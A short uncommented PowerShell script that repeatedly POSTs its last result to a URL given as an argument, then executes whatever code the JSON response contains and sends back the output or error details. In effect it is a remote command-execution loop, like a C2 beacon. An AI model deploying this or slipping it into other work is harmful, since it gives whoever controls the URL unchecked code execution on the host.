$CTX=@{}
$URL=$args[0]
$LAST=$null

function Eval {
	Try {
		return ConvertTo-Json (Invoke-Command -ScriptBlock (Invoke-Expression ("{{{0}}}" -f $args[0])))
	} Catch {
		return ConvertTo-Json @{type=$_.Exception.GetType().Name;
		                        message=$_.Exception.Message;
					stacktrace=$_.Exception.StackTrace}
	}
}

while ($true) {
	$LAST=Eval(ConvertFrom-Json (Invoke-WebRequest -Uri $URL -ContentType "application/json" -Method Post -Body $LAST).content)
}
